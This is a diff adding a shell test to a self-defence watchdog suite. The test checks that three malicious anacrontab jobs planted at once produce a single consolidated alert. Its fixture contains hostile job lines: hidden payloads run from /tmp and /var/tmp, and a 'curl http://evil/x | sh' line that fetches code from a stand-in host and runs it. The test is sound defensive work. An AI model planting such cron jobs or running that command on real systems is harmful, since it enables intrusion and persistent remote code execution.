@@ -268,3 +268,27 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (multi-job: 3 dangerous jobs in one anacrontab → single consolidated alert; aggregation discipline)" {
+    # Sister to many other watchdog multi-item-single-alert
+    # consolidation INVARIANTs across the brain. When an attacker
+    # plants multiple dangerous jobs in one anacrontab edit, the
+    # watchdog must consolidate into a SINGLE alert JSON record
+    # (not 3 separate alerts that would flood the operator
+    # dashboard). Locks the consolidation discipline alongside
+    # the SDD-062 single-line consumer contract.
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    cat > "${ANAC}" <<EOF
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+1	5	evil1	/tmp/.payload1
+1	5	evil2	/var/tmp/.payload2
+1	5	evil3	curl http://evil/x | sh
+EOF
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+    main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
+    [ "${main_count}" = "1" ]
+}
